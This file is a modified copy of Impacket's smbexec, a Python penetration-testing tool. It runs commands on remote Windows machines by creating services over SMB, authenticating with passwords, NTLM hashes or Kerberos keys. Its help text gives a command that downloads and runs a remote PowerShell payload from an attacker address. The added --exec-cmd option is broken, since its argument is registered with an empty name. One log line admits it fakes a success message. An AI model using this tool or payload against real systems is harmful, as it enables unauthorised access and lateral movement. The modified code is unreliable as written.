#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
#
# Modifications made by fsor-01 in 2025:
# - Added support for the --exec-cmd flag
#
# Description:
#   A similar approach to psexec w/o using RemComSvc. The technique is described here
#   https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access
#   Our implementation goes one step further, instantiating a local smbserver to receive the
#   output of the commands. This is useful in the situation where the target machine does NOT
#   have a writeable share available.
#   Keep in mind that, although this technique might help avoiding AVs, there are a lot of
#   event logs generated and you can't expect executing tasks that will last long since Windows
#   will kill the process since it's not responding as a Windows service.
#   Certainly not a stealthy way.
#
#   This script works in two ways:
#       1) share mode: you specify a share, and everything is done through that share.
#       2) server mode: if for any reason there's no share available, this script will launch a local
#          SMB server, so the output of the commands executed are sent back by the target machine
#          into a locally shared folder. Keep in mind you would need root access to bind to port 445
#          in the local machine.
#
# Author:
#   beto (@agsolino)
#
# Reference for:
#   DCE/RPC and SMB.
#

from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import argparse
try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import logging
from threading import Thread

from impacket.examples import logger
from impacket import version, smbserver
from impacket.dcerpc.v5 import transport, scmr
from impacket.krb5.keytab import Keytab

OUTPUT_FILENAME = '__output'
BATCH_FILENAME  = 'execute.bat'
SMBSERVER_DIR   = '__tmp'
DUMMY_SHARE     = 'TMP'
SERVICE_NAME    = 'BTOBTO'
CODEC = sys.stdout.encoding

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.smb = None

    def cleanup_server(self):
        logging.info('Cleaning up..')
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except OSError:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        logging.info('Creating tmp directory')
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception as e:
            logging.critical(str(e))
            pass
        logging.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logging.info('Ready to listen...')
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class CMDEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None,
                 doKerberos=None, kdcHost=None, mode=None, share=None, port=445,
                 serviceName=SERVICE_NAME, exec_cmd=None):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = serviceName
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__mode  = mode
        self.__exec_cmd = exec_cmd
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, remoteName, remoteHost):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        try:
            if self.__mode == 'SERVER':
                serverThread = SMBServer()
                serverThread.daemon = True
                serverThread.start()
            self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__exec_cmd)
            self.shell.cmdloop()
            if self.__mode == 'SERVER':
                serverThread.stop()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical(str(e))
            if self.shell is not None:
                self.shell.finish()
            sys.stdout.flush()
            sys.exit(1)

class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName, exec_cmd=None):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.__exec_cmd = exec_cmd
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute'
        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smb_connection()
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()

        # Execute command
        if self.__exec_cmd:
            self.send_data(self.__exec_cmd)
            self.finish()
            sys.exit(0)


        self.do_cd('')

    def execute_remote(self, data):
        if self.__exec_cmd:
            command = self.__exec_cmd
        else:
            command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & '
            command += self.__shell + self.__batchFile
            if self.__mode == 'SERVER':
                command += ' & ' + self.__copyBack
            command += ' & del ' + self.__batchFile

        logging.debug('Executing %s' % command)
        # command passed to lpBinaryPath
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
            # No real way to obtain log output without writing to disk. Just add a fake logging If it hits this, it means Command might have executed via start service.
            logging.warning(f"[+] Service started check command execution")

        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)

        if not self.__exec_cmd:
            self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        try:
            print(self.__outputBuffer.decode(CODEC))
        except UnicodeDecodeError:
            logging.error('Decoding error detected')
            print(self.__outputBuffer.decode(CODEC, errors='replace'))
        self.__outputBuffer = b''

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def do_cd(self, s):
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")
        self.execute_remote('cd')
        if len(self.__outputBuffer) > 0:
            self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
            self.__outputBuffer = b''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_shell(self, s):
        os.system(s)

    def finish(self):
        try:
            self.__scmr = self.__rpc.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp['lpServiceHandle']
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
            pass

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser()
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('', help='Run a custom command directly on the target and exit. eg:   \'cmd.exe /Q /c powershell.exe /c iex(iwr http://attackIP/evil.ps1 -useb)\'')
    parser.add_argument('-share', action='store', default='C$', help='share to grab output (default C$)')
    parser.add_argument('-mode', action='store', choices={'SERVER','SHARE'}, default='SHARE', help='mode to use')
    parser.add_argument('-ts', action='store_true', help='timestamp logging')
    parser.add_argument('-debug', action='store_true', help='debug output')
    parser.add_argument('-codec', action='store', help='output encoding (default %s)' % CODEC)

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', help='domain controller IP')
    group.add_argument('-target-ip', action='store', help='target machine IP')
    group.add_argument('-port', choices=['139', '445'], default='445', help='SMB port')
    group.add_argument('-service-name', default=SERVICE_NAME, help='service name to use')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', help='NTLM hashes LMHASH:NTHASH')
    group.add_argument('-no-pass', action='store_true', help='don\'t ask for password')
    group.add_argument('-k', action='store_true', help='use Kerberos authentication')
    group.add_argument('-aesKey', help='AES key for Kerberos')
    group.add_argument('-keytab', help='SPN keys from keytab')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts)

    if options.codec is not None:
        CODEC = options.codec
    elif CODEC is None:
        CODEC = 'utf-8'

    if options.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re
    domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

    if '@' in remoteName:
        password += '@' + remoteName.rpartition('@')[0]
        remoteName = remoteName.rpartition('@')[2]

    if domain is None:
        domain = ''

    if options.keytab:
        Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
        options.k = True

    if password == '' and username != '' and options.hashes is None and not options.no_pass and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.target_ip is None:
        options.target_ip = remoteName

    if options.aesKey:
        options.k = True

    try:
        executer = CMDEXEC(username, password, domain, options.hashes, options.aesKey, options.k,
                           options.dc_ip, options.mode, options.share, int(options.port),
                           options.service_name, exec_cmd=options.exec_cmd)
        executer.run(remoteName, options.target_ip)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.critical(str(e))

    sys.exit(0)
